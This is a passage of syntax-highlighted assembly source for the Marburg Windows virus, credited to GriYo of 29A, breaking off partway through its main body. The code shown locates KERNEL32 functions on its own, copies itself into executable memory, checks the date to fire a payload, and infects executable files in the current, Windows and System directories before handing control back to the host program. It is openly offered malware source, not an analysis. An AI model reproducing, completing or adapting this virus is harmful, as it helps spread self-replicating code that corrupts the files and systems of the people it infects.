</span><span class="sc1">;       Marburg ViRuS  - BioCoded by GriYo / 29A</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

                </span><span class="sc2">.386P</span><span class="sc0">
                </span><span class="sc5">locals</span><span class="sc0">
                </span><span class="sc5">jumps</span><span class="sc0">
                </span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc4">,</span><span class="sc10">STDCALL</span><span class="sc0">

                </span><span class="sc1">;Include the following files</span><span class="sc0">

                </span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">Win32api.inc</span><span class="sc0">
                </span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">Useful.inc</span><span class="sc0">
                </span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">Mz.inc</span><span class="sc0">
                </span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">Pe.inc</span><span class="sc0">

                </span><span class="sc1">;Some externals only used on 1st generation</span><span class="sc0">

                </span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GetModuleHandleA</span><span class="sc4">:</span><span class="sc10">NEAR</span><span class="sc0">
                </span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GetProcAddress</span><span class="sc4">:</span><span class="sc10">NEAR</span><span class="sc0">
                </span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc4">:</span><span class="sc10">NEAR</span><span class="sc0">

                </span><span class="sc1">;Some assumptions only valid for 1st generation</span><span class="sc0">

</span><span class="sc5">mem_size</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">mem_end</span><span class="sc4">-</span><span class="sc5">Mem_Base</span><span class="sc0">            </span><span class="sc1">;Size of virus in memory</span><span class="sc0">
</span><span class="sc5">inf_size</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">inf_end</span><span class="sc4">-</span><span class="sc5">Mem_Base</span><span class="sc0">            </span><span class="sc1">;Size of virus in files</span><span class="sc0">
</span><span class="sc5">init_size</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">init_end</span><span class="sc4">-</span><span class="sc5">Mem_Base</span><span class="sc0">           </span><span class="sc1">;Size of init code</span><span class="sc0">
</span><span class="sc5">base_default</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00400000h</span><span class="sc0">                   </span><span class="sc1">;Default base address</span><span class="sc0">

                </span><span class="sc1">;Current in-build settings</span><span class="sc0">

</span><span class="sc5">SIZE_PADDING</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00000065h</span><span class="sc0">
</span><span class="sc5">DECRYPTOR_SIZE</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00000800h</span><span class="sc0">
</span><span class="sc5">BUFFER_EP</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00000100h</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Fake host used for virus 1st generation</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">_TEXT</span><span class="sc0">           </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">use32</span><span class="sc0"> </span><span class="sc9">public</span><span class="sc0"> </span><span class="sc12">'CODE'</span><span class="sc0">

</span><span class="sc5">host_entry</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc1">;This code will find the base address of KERNEL32.DLL and</span><span class="sc0">
                </span><span class="sc1">;the entry point for GetProcAddress and GetModuleHandle</span><span class="sc0">
                </span><span class="sc1">;functions</span><span class="sc0">
                </span><span class="sc1">;This part will not be included on future infections</span><span class="sc0">
                </span><span class="sc1">;coz its only needed for virus 1st generation</span><span class="sc0">

                </span><span class="sc1">;Get KERNEL32 module handle</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">szKernel32</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetModuleHandleA</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">exit1st_gen</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">a_Kernel32</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc1">;Get address of GetModuleHandle function</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">szGetModuleH</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetProcAddress</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">exit1st_gen</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">a_GetModuleH</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc1">;Get address of GetProcAddress function</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">szGetProcAddr</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">a_Kernel32</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetProcAddress</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">exit1st_gen</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">a_GetProcAddr</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc1">;Execute virus</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">base_default</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">entry1st_gen</span><span class="sc0">

</span><span class="sc5">exit1st_gen</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc1">;Terminate virus launch process</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc0">

</span><span class="sc5">_TEXT</span><span class="sc0">           </span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">_DATA</span><span class="sc0">           </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">use32</span><span class="sc0"> </span><span class="sc9">public</span><span class="sc0"> </span><span class="sc12">'DATA'</span><span class="sc0">
</span><span class="sc5">_DATA</span><span class="sc0">           </span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">_BSS</span><span class="sc0">            </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">use32</span><span class="sc0"> </span><span class="sc9">public</span><span class="sc0"> </span><span class="sc12">'BSS'</span><span class="sc0">
</span><span class="sc5">_BSS</span><span class="sc0">            </span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Virus main body</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">virseg</span><span class="sc0">          </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">use32</span><span class="sc0"> </span><span class="sc9">public</span><span class="sc0"> </span><span class="sc12">'Marburg'</span><span class="sc0">

</span><span class="sc5">Mem_Base</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

</span><span class="sc5">virus_entry</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc1">;Get delta offset and host base address</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_delta</span><span class="sc0">

</span><span class="sc5">init_end</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

</span><span class="sc5">get_delta</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">get_delta</span><span class="sc0">

                </span><span class="sc1">;Get host base address</span><span class="sc0">
                </span><span class="sc1">;Generate a SUB ebx,fix_baseaddr instruction</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">81h</span><span class="sc4">,</span><span class="sc2">0EBh</span><span class="sc0">
</span><span class="sc5">fix_baseaddr</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">

                </span><span class="sc1">;Prepare return address</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">

                </span><span class="sc1">;Generate ADD eax,rva_org_eip</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">05h</span><span class="sc0">
</span><span class="sc5">rva_org_eip</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">

                </span><span class="sc1">;Save host entry-point into stack, we will jump there</span><span class="sc0">
                </span><span class="sc1">;later using a RET</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">entry1st_gen</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc1">;End of virus initialization, at this point:</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">; ss:[esp] - Host entry-point</span><span class="sc0">
                </span><span class="sc1">; ebx      - Base address</span><span class="sc0">
                </span><span class="sc1">; ebp      - Delta offset</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">

                </span><span class="sc1">;Check if we know the GetModuleHandle entry point</span><span class="sc0">
                </span><span class="sc1">;If we dont know it try to get KERNEL32 base</span><span class="sc0">
                </span><span class="sc1">;address using our own code</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0B8h</span><span class="sc0">
</span><span class="sc5">rva_GetModuleH</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">a_GetModuleH</span><span class="sc4">-</span><span class="sc5">base_default</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">use_our_own_1</span><span class="sc0">

                </span><span class="sc1">;Yes, eax is the rva for the function address</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">a_GetModuleH</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc1">;Now we know the address of GetModuleHandle,</span><span class="sc0">
                </span><span class="sc1">;so use it in order to get KERNEL32.dll</span><span class="sc0">
                </span><span class="sc1">;base address</span><span class="sc0">
                </span><span class="sc1">;If the function fails try to get KERNEL32 base</span><span class="sc0">
                </span><span class="sc1">;address using our own function</span><span class="sc0">

                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">szKernel32</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">a_GetModuleH</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">got_kernel</span><span class="sc0">

</span><span class="sc5">use_our_own_1</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc1">;No, grrr, try to get it by ourself</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">my_getkernel</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">err_virus_init</span><span class="sc0">

</span><span class="sc5">got_kernel</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc1">;Save KERNEL32 base address for l8r use</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">a_Kernel32</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc1">;Now check if we know the GetProcAddress entry point</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0B8h</span><span class="sc0">
</span><span class="sc5">rva_GetProcAddr</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">a_GetProcAddr</span><span class="sc4">-</span><span class="sc5">base_default</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">use_our_own_2</span><span class="sc0">

                </span><span class="sc1">;Yes, eax is the rva for the function address</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">got_getprocaddr</span><span class="sc0">

</span><span class="sc5">use_our_own_2</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc1">;Use our own routine to get GetProcAddress entry point</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">my_GetProcAddr</span><span class="sc0">

</span><span class="sc5">got_getprocaddr</span><span class="sc4">:</span><span class="sc1">;Save GetProcAddress entry point for l8r use</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">a_GetProcAddr</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc1">;Use GetProcAddress to get the rest of function addresses</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_functions</span><span class="sc0">
                </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">err_virus_init</span><span class="sc0">

                </span><span class="sc1">;Allocate some memory for the virus</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">PAGE_EXECUTE_READWRITE</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">MEM_RESERVE</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">MEM_COMMIT</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">mem_size</span><span class="sc4">+</span><span class="sc5">inf_size</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">a_VirtualAlloc</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc1">;Exit if cant find free memory... mmm...</span><span class="sc0">

                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">err_virus_init</span><span class="sc0">

                </span><span class="sc1">;Copy virus to allocated memory</span><span class="sc0">

                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Mem_Base</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">mem_size</span><span class="sc0">
                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

                </span><span class="sc1">;Jump to virus code into allocated memory</span><span class="sc0">

                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">mem_entry</span><span class="sc4">-</span><span class="sc5">Mem_Base</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Entry point for resident code</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">mem_entry</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc1">;From this point we no longer care about host</span><span class="sc0">
                </span><span class="sc1">;base address</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">mem_delta</span><span class="sc0">
</span><span class="sc5">mem_delta</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">mem_delta</span><span class="sc0">

                </span><span class="sc1">;Get current system time</span><span class="sc0">

                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">my_system_time</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">a_GetSysTime</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc1">;It's time to call our payload routine????</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">inf_month</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0003h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">000Ch</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">check_month</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc5">check_month</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">time_month</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">viral_sleep</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">inf_day</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">time_day</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">viral_sleep</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">payload</span><span class="sc0">

</span><span class="sc5">viral_sleep</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc1">;Do direct action stuff</span><span class="sc0">
                </span><span class="sc1">;The virus will infect files on \WINDOWS, \SYSTEM and</span><span class="sc0">
                </span><span class="sc1">;current directory</span><span class="sc0">

                </span><span class="sc1">;Try to infect files in current directory</span><span class="sc0">

                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">szWorkDir</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">MAX_PATH</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">a_GetCurDir</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">try_windir</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">do_in_dir</span><span class="sc0">
                
</span><span class="sc5">try_windir</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc1">;Get windows directory</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">MAX_PATH</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">szWorkDir</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">a_GetWindowsDir</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">try_sysdir</span><span class="sc0">

                </span><span class="sc1">;Try to infect files in \WINDOWS directory</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">do_in_dir</span><span class="sc0">

</span><span class="sc5">try_sysdir</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc1">;Get system directory</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">MAX_PATH</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">szWorkDir</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">a_GetSystemDir</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">err_virus_init</span><span class="sc0">

                </span><span class="sc1">;Try to infect files in \SYSTEM directory</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">do_in_dir</span><span class="sc0">

</span><span class="sc5">err_virus_init</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc1">;We have to restore code at host entry-point?</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">insert_size</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">back2host</span><span class="sc0">

                </span><span class="sc1">;Get current process</span><span class="sc0">

